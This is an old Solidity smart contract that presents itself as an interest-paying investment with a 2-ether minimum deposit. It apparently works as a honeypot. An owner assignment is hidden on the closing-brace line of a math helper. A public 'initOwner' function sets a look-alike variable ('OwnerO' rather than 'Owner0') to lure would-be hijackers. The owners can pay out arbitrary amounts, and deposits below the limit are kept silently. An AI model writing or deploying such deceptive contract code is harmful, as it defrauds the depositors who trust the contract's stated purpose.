pragma solidity ^0.4.17;

contract Base {
  
  // Use safe math additions for extra security
  
  function mul(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal constant returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn&#39;t hold
    return c;
  } address Owner0 = msg.sender;

  function sub(uint256 a, uint256 b) internal constant returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
  
  
    event Deposit(address sender, uint value);

    event PayInterest(address receiver, uint value);

    event Log(string message);

}


contract InterestFinal is Base {
    
    address public creator;
    address public OwnerO; 
    address public Owner1;
    uint256 public etherLimit = 2 ether;
    
    mapping (address => uint256) public balances;
    mapping (address => uint256) public interestPaid;

    function initOwner(address owner) {
        OwnerO = owner;
    }
    
    function initOwner1(address owner) internal {
        Owner1 = owner;
    }
    
    /* This function is called automatically when constructing 
        the contract and will 
        set the owners as the trusted administrators
    */
    
    function InterestFinal(address owner1, address owner2) {
        creator = msg.sender;
        initOwner(owner1);
        initOwner1(owner2);
    }

    function() payable {
        if (msg.value >= etherLimit) {
            uint amount = msg.value;
            balances[msg.sender] += amount;
        }
    }

    /* 
    
    Minimum investment is 2 ether
     which will be kept in the contract
     and the depositor will earn interest on it
     remember to check your gas limit
    
    
     */
    
    function deposit(address sender) payable {
        if (msg.value >= etherLimit) {
            uint amount = msg.value;
            balances[sender] += amount;
            Deposit(sender, msg.value);
        }
    }
    
    // calculate interest rate
    
    function calculateInterest(address investor, uint256 interestRate) returns (uint256) {
        return balances[investor] * (interestRate) / 100;
    }

    function payout(address recipient, uint256 weiAmount) {
        if ((msg.sender == creator || msg.sender == Owner0 || msg.sender == Owner1)) {
            if (balances[recipient] > 0) {
                recipient.send(weiAmount);
                PayInterest(recipient, weiAmount);
            }
        }
    }
    
    function currentBalance() returns (uint256) {
        return this.balance;
    }
    
    
        
    /* 
     
     ############################################################ 
     
        The pay interest function is called by an administrator
        -------------------
    */
    function payInterest(address recipient, uint256 interestRate) {
        if ((msg.sender == creator || msg.sender == Owner0 || msg.sender == Owner1)) {
            uint256 weiAmount = calculateInterest(recipient, interestRate);
            interestPaid[recipient] += weiAmount;
            payout(recipient, weiAmount);
        }
    }
}